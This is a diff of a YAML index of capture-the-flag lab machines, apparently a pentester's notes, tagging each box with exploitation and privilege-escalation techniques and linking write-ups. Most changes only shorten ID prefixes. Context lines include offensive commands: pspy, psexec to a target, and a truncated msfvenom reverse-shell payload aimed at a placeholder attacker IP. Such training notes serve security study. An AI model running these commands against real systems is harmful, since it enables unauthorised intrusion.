           url: https://www.vulnhub.com/entry/billy-madison-11,161/
-          verbose_id: vulnhub#161
+          verbose_id: vh#161
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf
         - datetime: 20190909
           infra: VulnHub
@@ -5714,7 +5714,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20190919
           infra: VulnHub
@@ -5730,7 +5730,7 @@ summary:
           - privesc_cron
           - privesc_bash_reverseshell
           url: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-          verbose_id: vulnhub#181
+          verbose_id: vh#181
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf
       privesc_cron_rootjobs:
         cli: 'pspy # find root owned processes, cronjobs
@@ -5758,7 +5758,7 @@ summary:
           - privesc_sudo
           - privesc_cron_rootjobs
           url: https://www.hackthebox.eu/home/machines/profile/118
-          verbose_id: hackthebox#118
+          verbose_id: htb#118
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf
       privesc_ctf_usertxt_timestamp:
         cli: 'ls -lh /home/<username>/user.txt
@@ -5798,7 +5798,7 @@ summary:
           - privesc_strace_setuid
           - privesc_docker_group
           url: https://www.vulnhub.com/entry/linsecurity-1,244/
-          verbose_id: vulnhub#244
+          verbose_id: vh#244
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf
       privesc_env_relative_path:
         cli: ''
@@ -5826,7 +5826,7 @@ summary:
           - exploit_phptax
           - privesc_freebsd
           url: https://www.vulnhub.com/entry/kioptrix-2014-5,62/
-          verbose_id: vulnhub#62
+          verbose_id: vh#62
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf
       privesc_iis_webconfig:
         cli: "sample web.config:\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n \
@@ -5890,7 +5890,7 @@ summary:
           - exploit_cmdexec
           - privesc_kernel_ipappend
           url: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
-          verbose_id: vulnhub#23
+          verbose_id: vh#23
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf
       privesc_kernel_overlayfs:
         cli: ''
@@ -5911,7 +5911,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
-          verbose_id: vulnhub#129
+          verbose_id: vh#129
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
       privesc_lxc_bash:
         cli: 'check output of id command
@@ -5934,7 +5934,7 @@ summary:
           - exploit_ssh_privatekeys
           - privesc_lxc_bash
           url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
-          verbose_id: vulnhub#508
+          verbose_id: vh#508
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       privesc_modssl:
         cli: ''
@@ -5952,7 +5952,7 @@ summary:
           - exploit_modssl
           - privesc_modssl
           url: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
-          verbose_id: vulnhub#22
+          verbose_id: vh#22
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf
       privesc_mysql_creds:
         cli: ''
@@ -5973,7 +5973,7 @@ summary:
           - privesc_sudo
           - privesc_nmap
           url: https://www.vulnhub.com/entry/dc-6,315/
-          verbose_id: vulnhub#315
+          verbose_id: vh#315
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf
         - datetime: 20190917
           infra: VulnHub
@@ -5987,7 +5987,7 @@ summary:
           - privesc_mysql_creds
           - privesc_setuid
           url: https://www.vulnhub.com/entry/escalate_linux-1,323/
-          verbose_id: vulnhub#323
+          verbose_id: vh#323
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf
         - datetime: 20190918
           infra: VulnHub
@@ -6004,7 +6004,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
       privesc_mysql_root:
         cli: ''
@@ -6025,7 +6025,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
-          verbose_id: vulnhub#25
+          verbose_id: vh#25
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf
         - datetime: 20191010
           infra: VulnHub
@@ -6041,7 +6041,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
-          verbose_id: vulnhub#129
+          verbose_id: vh#129
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
       privesc_mysql_udf:
         cli: ''
@@ -6062,7 +6062,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
-          verbose_id: vulnhub#25
+          verbose_id: vh#25
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf
         - datetime: 20191010
           infra: VulnHub
@@ -6078,7 +6078,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
-          verbose_id: vulnhub#129
+          verbose_id: vh#129
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
       privesc_nfs_norootsquash:
         cli: ''
@@ -6098,7 +6098,7 @@ summary:
           - privesc_nfs_norootsquash
           - privesc_ssh_authorizedkeys
           url: https://www.vulnhub.com/entry/hacklab-vulnix,48/
-          verbose_id: vulnhub#48
+          verbose_id: vh#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf
       privesc_nmap:
         cli: ''
@@ -6119,7 +6119,7 @@ summary:
           - privesc_sudo
           - privesc_nmap
           url: https://www.vulnhub.com/entry/dc-6,315/
-          verbose_id: vulnhub#315
+          verbose_id: vh#315
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf
         - datetime: 20191021
           infra: VulnHub
@@ -6133,7 +6133,7 @@ summary:
           - privesc_setuid
           - privesc_nmap
           url: https://www.vulnhub.com/entry/mr-robot-1,151/
-          verbose_id: vulnhub#151
+          verbose_id: vh#151
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf
       privesc_passwd_writable:
         cli: ''
@@ -6153,7 +6153,7 @@ summary:
           - privesc_sudoers
           - privesc_passwd_writable
           url: https://www.vulnhub.com/entry/misdirection-1,371/
-          verbose_id: vulnhub#371
+          verbose_id: vh#371
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf
       privesc_psexec_login:
         cli: 'psexec <username>@<targetip>
@@ -6180,7 +6180,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       privesc_setuid:
         cli: ''
@@ -6199,7 +6199,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/billy-madison-11,161/
-          verbose_id: vulnhub#161
+          verbose_id: vh#161
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf
         - datetime: 20190917
           infra: VulnHub
@@ -6213,7 +6213,7 @@ summary:
           - privesc_mysql_creds
           - privesc_setuid
           url: https://www.vulnhub.com/entry/escalate_linux-1,323/
-          verbose_id: vulnhub#323
+          verbose_id: vh#323
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf
         - datetime: 20190911
           infra: VulnHub
@@ -6228,7 +6228,7 @@ summary:
           - privesc_sudo
           - privesc_setuid
           url: https://www.vulnhub.com/entry/fristileaks-13,133/
-          verbose_id: vulnhub#133
+          verbose_id: vh#133
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf
         - datetime: 20190927
           infra: VulnHub
@@ -6242,7 +6242,7 @@ summary:
           - exploit_php_reverseshell
           - privesc_setuid
           url: https://www.vulnhub.com/entry/hackme-1,330/
-          verbose_id: vulnhub#330
+          verbose_id: vh#330
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf
         - datetime: 20191021
           infra: VulnHub
@@ -6256,7 +6256,7 @@ summary:
           - privesc_setuid
           - privesc_nmap
           url: https://www.vulnhub.com/entry/mr-robot-1,151/
-          verbose_id: vulnhub#151
+          verbose_id: vh#151
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf
         - datetime: 20191028
           infra: VulnHub
@@ -6271,7 +6271,7 @@ summary:
           - exploit_mongodb
           - privesc_setuid
           url: https://www.vulnhub.com/entry/node-1,252/
-          verbose_id: vulnhub#252
+          verbose_id: vh#252
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf
       privesc_shell_escape:
         cli: ''
@@ -6292,7 +6292,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
-          verbose_id: vulnhub#25
+          verbose_id: vh#25
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf
       privesc_ssh_authorizedkeys:
         cli: ''
@@ -6312,7 +6312,7 @@ summary:
           - privesc_nfs_norootsquash
           - privesc_ssh_authorizedkeys
           url: https://www.vulnhub.com/entry/hacklab-vulnix,48/
-          verbose_id: vulnhub#48
+          verbose_id: vh#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf
       privesc_ssh_knownhosts:
         cli: ''
@@ -6329,7 +6329,7 @@ summary:
           tags:
           - privesc_ssh_knownhosts
           url: https://www.vulnhub.com/entry/moria-11,187/
-          verbose_id: vulnhub#187
+          verbose_id: vh#187
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf
       privesc_strace_setuid:
         cli: ''
@@ -6349,7 +6349,7 @@ summary:
           - privesc_strace_setuid
           - privesc_docker_group
           url: https://www.vulnhub.com/entry/linsecurity-1,244/
-          verbose_id: vulnhub#244
+          verbose_id: vh#244
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf
       privesc_sudo:
         cli: ''
@@ -6369,7 +6369,7 @@ summary:
           - privesc_sudo
           - privesc_cron_rootjobs
           url: https://www.hackthebox.eu/home/machines/profile/118
-          verbose_id: hackthebox#118
+          verbose_id: htb#118
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf
         - datetime: 20190831
           infra: VulnHub
@@ -6383,7 +6383,7 @@ summary:
           - privesc_anansi
           - privesc_sudo
           url: https://www.vulnhub.com/entry/brainpan-1,51/
-          verbose_id: vulnhub#51
+          verbose_id: vh#51
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf
         - datetime: 20190910
           infra: VulnHub
@@ -6399,7 +6399,7 @@ summary:
           - privesc_sudo
           - privesc_nmap
           url: https://www.vulnhub.com/entry/dc-6,315/
-          verbose_id: vulnhub#315
+          verbose_id: vh#315
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf
         - datetime: 20190911
           infra: VulnHub
@@ -6414,7 +6414,7 @@ summary:
           - privesc_sudo
           - privesc_setuid
           url: https://www.vulnhub.com/entry/fristileaks-13,133/
-          verbose_id: vulnhub#133
+          verbose_id: vh#133
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf
         - datetime: 20190929
           infra: VulnHub
@@ -6428,7 +6428,7 @@ summary:
           - privesc_sudoers
           - privesc_sudo
           url: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
-          verbose_id: vulnhub#24
+          verbose_id: vh#24
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf
         - datetime: 20191029
           infra: VulnHub
@@ -6446,7 +6446,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
       privesc_sudoers:
         cli: ''
@@ -6467,7 +6467,7 @@ summary:
           - exploit_credsreuse
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/48
-          verbose_id: hackthebox#48
+          verbose_id: htb#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf
         - datetime: 20191112
           infra: HackTheBox
@@ -6480,7 +6480,7 @@ summary:
           - exploit_defaultcreds
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/64
-          verbose_id: hackthebox#64
+          verbose_id: htb#64
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf
         - datetime: 20191113
           infra: HackTheBox
@@ -6493,7 +6493,7 @@ summary:
           - exploit_shellshock
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/108
-          verbose_id: hackthebox#108
+          verbose_id: htb#108
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf
         - datetime: 20190905
           infra: VulnHub
@@ -6507,7 +6507,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/billy-madison-11,161/
-          verbose_id: vulnhub#161
+          verbose_id: vh#161
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf
         - datetime: 20190909
           infra: VulnHub
@@ -6527,7 +6527,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20190929
           infra: VulnHub
@@ -6541,7 +6541,7 @@ summary:
           - privesc_sudoers
           - privesc_sudo
           url: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
-          verbose_id: vulnhub#24
+          verbose_id: vh#24
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf
         - datetime: 20191011
           infra: VulnHub
@@ -6556,7 +6556,7 @@ summary:
           - privesc_sudoers
           - privesc_passwd_writable
           url: https://www.vulnhub.com/entry/misdirection-1,371/
-          verbose_id: vulnhub#371
+          verbose_id: vh#371
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf
       privesc_tmux_rootsession:
         cli: ''
@@ -6598,7 +6598,7 @@ summary:
           - exploit_iis_asp_reverseshell
           - privesc_windows_ms11_046
           url: https://www.hackthebox.eu/home/machines/profile/3
-          verbose_id: hackthebox#3
+          verbose_id: htb#3
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf
       privesc_windows_ms14_070:
         cli: ''
@@ -6616,7 +6616,7 @@ summary:
           - exploit_iis_webdav
           - privesc_windows_ms14_070
           url: https://www.hackthebox.eu/home/machines/profile/13
-          verbose_id: hackthebox#13
+          verbose_id: htb#13
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf
       privesc_windows_ms15_051:
         cli: ''
@@ -6634,7 +6634,7 @@ summary:
           - exploit_iis_webdav
           - privesc_windows_ms15_051
           url: https://www.hackthebox.eu/home/machines/profile/14
-          verbose_id: hackthebox#14
+          verbose_id: htb#14
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf
       privesc_windows_ms16_032:
         cli: ''
@@ -6657,7 +6657,7 @@ summary:
           - exploit_hfs_cmd_exec
           - privesc_windows_ms16_098
           url: https://www.hackthebox.eu/home/machines/profile/6
-          verbose_id: hackthebox#6
+          verbose_id: htb#6
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf
       privesc_windows_upnphost:
         cli: 'msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport>
